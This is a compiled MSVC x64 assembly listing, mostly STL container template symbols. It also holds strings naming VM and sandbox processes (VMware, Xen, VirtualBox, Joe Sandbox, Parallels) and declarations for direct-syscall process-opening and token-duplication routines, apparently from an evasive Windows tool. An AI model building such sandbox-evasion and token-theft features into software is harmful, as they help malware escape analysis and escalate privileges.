; Listing generated by Microsoft (R) Optimizing Compiler Version 19.40.33811.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_0L@DNNKDIOP@vmware?4exe@			; `string'
PUBLIC	??_C@_0P@DGCBIEC@xenservice?4exe@		; `string'
PUBLIC	??_C@_0L@LABEJICF@vmsrvc?4exe@			; `string'
PUBLIC	??_C@_0BA@FBEFMLMI@vboxservice?4exe@		; `string'
PUBLIC	??_C@_0BB@JMNMFDHB@joeboxserver?4exe@		; `string'
PUBLIC	??_C@_0L@KKOIMBEN@prl_cc?4exe@			; `string'
PUBLIC	??_C@_00CNPNBAHC@@				; `string'
PUBLIC	??_C@_1BO@JHOJBCBI@?$AAS?$AAe?$AAr?$AAv?$AAi?$AAc?$AAe?$AAs?$AAA?$AAc?$AAt?$AAi?$AAv?$AAe@ ; `string'
PUBLIC	??_C@_0CA@MMOGIFNF@invalid?5unordered_map?$DMK?0?5T?$DO?5key@ ; `string'
PUBLIC	??_C@_0BL@GOIGLPKN@unordered_map?1set?5too?5long@ ; `string'
PUBLIC	??_C@_0BK@OGNNAFAB@invalid?5hash?5bucket?5count@ ; `string'
PUBLIC	?_Min_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@2_KB ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Min_buckets
PUBLIC	?_FreeLibrary@@3P6AHPEAX@ZEA			; _FreeLibrary
EXTRN	SysNtDuplicateToken:PROC
EXTRN	__imp_SysFreeString:PROC
EXTRN	__imp_SysAllocString:PROC
EXTRN	system:PROC
EXTRN	__imp_Sleep:PROC
EXTRN	SysNtOpenProcess:PROC
EXTRN	?ConvertBSTRToString@_com_util@@YAPEADPEA_W@Z:PROC ; _com_util::ConvertBSTRToString
EXTRN	GetPebAddress:PROC
EXTRN	tolower:PROC
EXTRN	SysNtClose:PROC
EXTRN	SysNtOpenProcessTokenEx:PROC
EXTRN	?_com_issue_error@@YAXJ@Z:PROC			; _com_issue_error
?_FreeLibrary@@3P6AHPEAX@ZEA DQ 01H DUP (?)		; _FreeLibrary
_BSS	ENDS
;	COMDAT ?_Min_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@2_KB
CONST	SEGMENT
?_Min_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@2_KB DQ 0000000000000008H ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Min_buckets
CONST	ENDS
;	COMDAT ??_C@_0BK@OGNNAFAB@invalid?5hash?5bucket?5count@
CONST	SEGMENT
??_C@_0BK@OGNNAFAB@invalid?5hash?5bucket?5count@ DB 'invalid hash bucket '
	DB	'count', 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_0BL@GOIGLPKN@unordered_map?1set?5too?5long@
CONST	SEGMENT
??_C@_0BL@GOIGLPKN@unordered_map?1set?5too?5long@ DB 'unordered_map/set t'
	DB	'oo long', 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0CA@MMOGIFNF@invalid?5unordered_map?$DMK?0?5T?$DO?5key@
CONST	SEGMENT
??_C@_0CA@MMOGIFNF@invalid?5unordered_map?$DMK?0?5T?$DO?5key@ DB 'invalid'
	DB	' unordered_map<K, T> key', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_1BO@JHOJBCBI@?$AAS?$AAe?$AAr?$AAv?$AAi?$AAc?$AAe?$AAs?$AAA?$AAc?$AAt?$AAi?$AAv?$AAe@
CONST	SEGMENT
??_C@_1BO@JHOJBCBI@?$AAS?$AAe?$AAr?$AAv?$AAi?$AAc?$AAe?$AAs?$AAA?$AAc?$AAt?$AAi?$AAv?$AAe@ DB 'S'
	DB	00H, 'e', 00H, 'r', 00H, 'v', 00H, 'i', 00H, 'c', 00H, 'e', 00H
	DB	's', 00H, 'A', 00H, 'c', 00H, 't', 00H, 'i', 00H, 'v', 00H, 'e'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_00CNPNBAHC@@
CONST	SEGMENT
??_C@_00CNPNBAHC@@ DB 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@KKOIMBEN@prl_cc?4exe@
CONST	SEGMENT
??_C@_0L@KKOIMBEN@prl_cc?4exe@ DB 'prl_cc.exe', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BB@JMNMFDHB@joeboxserver?4exe@
CONST	SEGMENT
??_C@_0BB@JMNMFDHB@joeboxserver?4exe@ DB 'joeboxserver.exe', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@FBEFMLMI@vboxservice?4exe@
CONST	SEGMENT
??_C@_0BA@FBEFMLMI@vboxservice?4exe@ DB 'vboxservice.exe', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@LABEJICF@vmsrvc?4exe@
CONST	SEGMENT
??_C@_0L@LABEJICF@vmsrvc?4exe@ DB 'vmsrvc.exe', 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0P@DGCBIEC@xenservice?4exe@
CONST	SEGMENT
??_C@_0P@DGCBIEC@xenservice?4exe@ DB 'xenservice.exe', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0L@DNNKDIOP@vmware?4exe@
CONST	SEGMENT
??_C@_0L@DNNKDIOP@vmware?4exe@ DB 'vmware.exe', 00H	; `string'
PUBLIC	??$forward@PEAUHINSTANCE__@@@std@@YA$$QEAPEAUHINSTANCE__@@AEAPEAU1@@Z ; std::forward<HINSTANCE__ *>
PUBLIC	??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *><char const *,HINSTANCE__ *,0>
PUBLIC	??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z ; std::construct_at<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::pair<char const *,HINSTANCE__ *>,0>
PUBLIC	??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::`scalar deleting destructor'
PUBLIC	??$_Traits_equal@U?$char_traits@D@std@@@std@@YA_NQEBD_K01@Z ; std::_Traits_equal<std::char_traits<char> >
PUBLIC	??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEBQEAU10@@Z ; std::construct_at<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &,0>
PUBLIC	??$forward@AEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEBQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z ; std::forward<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &>
PUBLIC	??$construct_at@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@$0A@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@QEAV10@AEBV10@@Z ; std::construct_at<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &,0>
PUBLIC	??$addressof@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAPEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z ; std::addressof<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
PUBLIC	??1?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@XZ ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::~pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>
PUBLIC	??$destroy_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@YAXQEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@@Z ; std::destroy_at<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
PUBLIC	??$forward@_N@std@@YA$$QEA_NAEA_N@Z		; std::forward<bool>
PUBLIC	??$forward@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YA$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEAV10@@Z ; std::forward<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >
PUBLIC	??$construct@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::construct<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::pair<char const *,HINSTANCE__ *> >
PUBLIC	?_Equal@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_NAEBV12@@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Equal
PUBLIC	??0?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@@Z ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
PUBLIC	?_Allocate@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAXXZ ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Allocate
PUBLIC	??$_Construct_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEBQEAU12@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEBQEAU10@@Z ; std::_Construct_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * const &>
PUBLIC	??$exchange@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@$$T@std@@YAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@$$QEA$$T@Z ; std::exchange<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::nullptr_t>
PUBLIC	??$_Construct_in_place@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@AEBV12@@std@@YAXAEAV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z ; std::_Construct_in_place<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>
PUBLIC	??$forward@AEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@YAAEBV?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@0@AEBV10@@Z ; std::forward<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > const &>
PUBLIC	??$destroy@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@QEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::destroy<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
PUBLIC	??$?0V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N$0A@@?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@std@@QEAA@$$QEAV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@1@$$QEA_N@Z ; std::pair<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool>::pair<std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool><std::_List_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > >,bool,0>
PUBLIC	??$?0U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@AEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > ><std::pair<char const *,HINSTANCE__ *> >
PUBLIC	??$?0U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@QEAA@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ; std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > ><std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >
PUBLIC	??$?8DU?$char_traits@D@std@@V?$allocator@D@1@@std@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@0@Z ; std::operator==<char,std::char_traits<char>,std::allocator<char> >
PUBLIC	?_Orphan_non_end@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXXZ ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Orphan_non_end
PUBLIC	??0_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@AEAV?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::_Range_eraser
PUBLIC	?_Bump_erased@_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::_Bump_erased
PUBLIC	??1_Range_eraser@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Range_eraser::~_Range_eraser
PUBLIC	?clear@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAXXZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::clear
PUBLIC	?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_erase
